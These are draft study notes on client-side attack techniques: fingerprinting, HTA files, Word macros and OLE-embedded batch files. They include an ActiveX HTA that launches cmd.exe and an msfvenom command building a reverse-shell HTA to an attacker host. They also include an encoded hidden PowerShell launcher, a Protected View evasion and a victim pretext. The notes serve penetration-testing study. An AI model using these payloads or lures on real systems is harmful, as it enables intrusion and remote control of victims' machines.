---
title: active-information-gathering
aliases: []
tags:
- topic/active-information-gathering
- tool/fingerprintjs2
- tool/mshta
- tool/msfvenom
- tool/WordMacro
- tool/ObjectLinkingAndEmbedding
category: study_notes
status: draft
date_created: '2026-08-27'
date_modified: '2026-08-27'
source: notes.md
related_tools:
- '[[fingerprintjs2]]'
- '[[mshta]]'
- '[[msfvenom]]'
related_techniques:
- '[[t1189]]'
- '[[T1566]]'
related_tactics:
- '[[ta0005]]'
- '[[ta0003]]'
related_services: []
related_os: []
related_notes: []
mitre_tactic: ''
mitre_technique: ''
real_path: ''
port: ''
protocol: ''
os: ''
---

# active-information-gathering

## Introduction
This note covers active information gathering techniques, including passive client information, active client information, social engineering, and client fingerprinting.

## Social Engineering
- Pretexting: Sending a malformed Word document and asking the victim to call, then inquiring about their Office version and OS.
- Client Fingerprinting: Using a web page to execute a payload and gather client information.

## Client Fingerprinting
- Using `fingerprintjs2` to gather client information.
- Example command: `sudo wget https://github.com/Valve/fingerprintjs2/archive/master.zip`

## HTML Applications (HTA)
- HTA files are only targeted at Internet Explorer and sometimes Edge.
- Uses ActiveX objects to execute code inside a script tag.
- Example HTA payload: `mshta.exe` and `html <html><head><script> var c='cmd.exe'; new ActiveXObject('Wscript.Shell').Run(c);</script></head><body><script>self.close();</script></body></html>`
- Generating payload with `msfvenom`: `sudo msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.4 LPORT=4444 -f hta-psh -o /var/www/html/evil.hta`

## Microsoft Office
- Word Macro in VBA: Must be saved as `.docm` or `.doc` not `.docx`.
- Requires the user to enable macros by clicking 'Enable Content'.
- Example VBA code: `Sub MyMacro() ... End Sub` and `Sub AutoOpen() MyMacro End Sub` and `Sub Document_Open() MyMacro End Sub`
- Evading Protected View: Publisher allows embedded objects but does not enable Protected View for internet-delivered documents.

## Object Linking and Embedding
- Embedding batch files inside a Word document.
- Example batch file: `launch.bat` with `cmd START cmd.exe` or `START powershell.exe -nop -w hidden -e JABzACAAPQAgAE4AZQB3AC0ATwBiAGoAZQBj....`
- Inserting the batch file into Word as an object and changing the icon and caption.

## References
- https://github.com/danielmiessler/SecLists

